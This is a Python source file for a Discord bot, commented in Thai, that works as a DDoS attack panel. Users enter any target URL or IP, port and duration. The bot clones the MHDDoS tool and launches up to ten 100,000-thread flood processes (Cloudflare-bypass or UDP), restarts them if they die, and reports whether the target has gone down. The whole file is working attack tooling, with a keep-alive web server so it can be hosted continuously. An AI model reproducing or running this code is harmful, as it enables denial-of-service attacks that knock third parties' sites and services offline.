import os
import threading
import asyncio
import subprocess
import time
import re
import requests
from flask import Flask
import discord
from discord import app_commands
from discord.ui import View, Button, Modal, TextInput

# --- ตรวจสอบและดาวน์โหลด MHDDoS อัตโนมัติถ้ายังไม่มี ---
if not os.path.exists("MHDDoS"):
    print("กำลังดาวน์โหลดเครื่องมือ MHDDoS...")
    subprocess.run(["git", "clone", "https://github.com/MatrixTM/MHDDoS.git"])

# --- สร้าง Web Server เพื่อให้ Render รันบอทได้ตลอดเวลา ---
app = Flask('')

@app.route('/')
def home():
    return "DDoS Bot is running!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web)
    t.start()

# --- Discord Bot Setup ---
intents = discord.Intents.default()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

def get_best_method(target):
    """คำนวณเลือก Method ที่แรงและเหมาะที่สุดอัตโนมัติ"""
    clean_target = target.strip()
    if clean_target.startswith("http://") or clean_target.startswith("https://"):
        return "CFB"  # เว็บไซต์ใช้ Cloudflare Bypass แรงสุด
    
    ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
    base_target = clean_target.split(":")[0]
    if re.match(ip_pattern, base_target):
        return "UDP"  # IP ล้วนใช้ UDP ดับไวที่สุด
    else:
        return "CFB"

class DDoSModal(Modal, title="ตั้งค่าการโจมตี - เดียวรู้กัน"):
    target = TextInput(label="URL หรือ IP เว็บเป้าหมาย", placeholder="เช่น https://example.com หรือ 1.2.3.4", required=True)
    port = TextInput(label="Port เว็บ", placeholder="เช่น 80 หรือ 443", required=True)
    machines = TextInput(label="จำนวนเครื่อง (1 เครื่อง = 1 แสนเทรด)", placeholder="1 ถึง 10", default="1", required=True, max_length=2)
    duration = TextInput(label="ระยะเวลา (วินาที เช่น 500)", placeholder="500", required=True, max_length=4)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            mach = int(self.machines.value)
            dur = int(self.duration.value)
            if mach < 1: mach = 1
            if mach > 10: mach = 10
            if dur < 1: dur = 1
        except ValueError:
            await interaction.response.send_message("❌ กรุณากรอกตัวเลขให้ถูกต้อง!", ephemeral=True)
            return

        target_val = self.target.value.strip()
        port_val = self.port.value.strip()
        
        meth_val = get_best_method(target_val)
        threads_per_machine = 100000
        total_threads = mach * threads_per_machine

        target_full = target_val if target_val.startswith("http") else f"http://{target_val}:{port_val}"

        embed = discord.Embed(
            title="🎯 เดียวรู้กัน - กำลังเตรียมระบบ...",
            description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n🧠 **Method:** `{meth_val}`\n💻 **พลัง:** `{mach} เครื่อง` (`{total_threads:,} เทรด/วิ`)\n⏱️ **เวลา:** `{dur} วินาที`",
            color=discord.Color.orange()
        )
        await interaction.response.send_message(embed=embed, ephemeral=False)
        msg = await interaction.original_response()

        # สร้างคำสั่งรัน MHDDoS แบบมาตรฐานที่แม่นยำที่สุด
        l4_methods = ["UDP", "TCP", "SYN", "OVH-UDP", "CPS", "ICMP"]
        
        processes = []
        try:
            for _ in range(mach):
                if meth_val in l4_methods:
                    cmd = ["python3", "MHDDoS/start.py", meth_val, f"{target_val}:{port_val}", str(threads_per_machine), str(dur)]
                else:
                    cmd = ["python3", "MHDDoS/start.py", meth_val, target_full, str(threads_per_machine), str(dur)]
                
                p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                processes.append((cmd, p))
        except Exception as e:
            embed.title = "❌ เกิดข้อผิดพลาด"
            embed.description = str(e)
            embed.color = discord.Color.red()
            await msg.edit(embed=embed)
            return

        start_time = time.time()
        
        # ระบบคุมเวลาแบบเด็ดขาด (บังคับรันจนครบเวลา ห้ามจบก่อนเด็ดขาด พร้อมระบบรีสตาร์ทอัตโนมัติถ้าโปรเซสดับ)
        while True:
            elapsed = int(time.time() - start_time)
            if elapsed >= dur:
                break
            
            # เช็คว่าถ้าตัวไหนดับระหว่างทาง ให้ดีดเปิดใหม่ทันทีเพื่อความต่อเนื่อง
            for idx, (cmd, p) in enumerate(processes):
                if p.poll() is not None:
                    new_p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    processes[idx] = (cmd, new_p)

            # เช็คสถานะเว็บแบบเรียลไทม์
            try:
                res_start = time.time()
                r = requests.get(target_full, timeout=2)
                speed_ms = int((time.time() - res_start) * 1000)
                status_code = r.status_code
            except:
                speed_ms = 0
                status_code = "0 (ไม่ตอบสนอง / Down ☠️)"

            live_embed = discord.Embed(
                title="🔥 เดียวรู้กัน - กำลังอัดยับต่อเนื่อง...",
                description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n🧠 **Method:** `{meth_val}`\n⏱️ **เวลา:** `{elapsed} / {dur} วินาที`\n⚡ **ความเร็วตอบสนอง:** `{speed_ms} ms`\n📌 **สถานะเว็บ:** `{status_code}`\n🚀 **พลังอัด:** `{mach} เครื่อง` (`{total_threads:,} เทรด/วิ`)",
                color=discord.Color.red()
            )
            try:
                await msg.edit(embed=live_embed)
            except:
                pass
            
            await asyncio.sleep(3)

        # เมื่อครบเวลาที่กำหนดจริงๆ ถึงจะสั่งปิดทุกตัว
        for _, p in processes:
            try:
                p.terminate()
            except:
                pass
        
        success_embed = discord.Embed(
            title="✅ สำเร็จแล้ว!",
            description=f"ยิงถล่มเป้าหมาย `{target_val}:{port_val}` ด้วยพลัง `{total_threads:,} เทรด/วิ` ครบถ้วนตามเวลา `{dur} วินาที` เรียบร้อย",
            color=discord.Color.green()
        )
        await msg.edit(embed=success_embed)

class DDoSView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 เริ่มตั้งค่าการยิง", style=discord.ButtonStyle.danger, custom_id="start_ddos_btn")
    async def button_callback(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(DDoSModal())

@tree.command(name="d", description="เปิดเมนูเดียวรู้กัน")
async def d_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔥 เดียวรู้กัน - Panel",
        description="กดปุ่มด้านล่างเพื่อใส่ข้อมูลเป้าหมาย",
        color=discord.Color.blurple()
    )
    await interaction.response.send_message(embed=embed, view=DDoSView(), ephemeral=False)

@client.event
async def on_ready():
    await tree.sync()
    print(f"Logged in as {client.user}")

if __name__ == "__main__":
    keep_alive()
    TOKEN = os.getenv("BOT_TOKEN")
    if TOKEN:
        client.run(TOKEN)
    else:
        print("ERROR: ไม่พบ BOT_TOKEN ใน Environment Variables!")
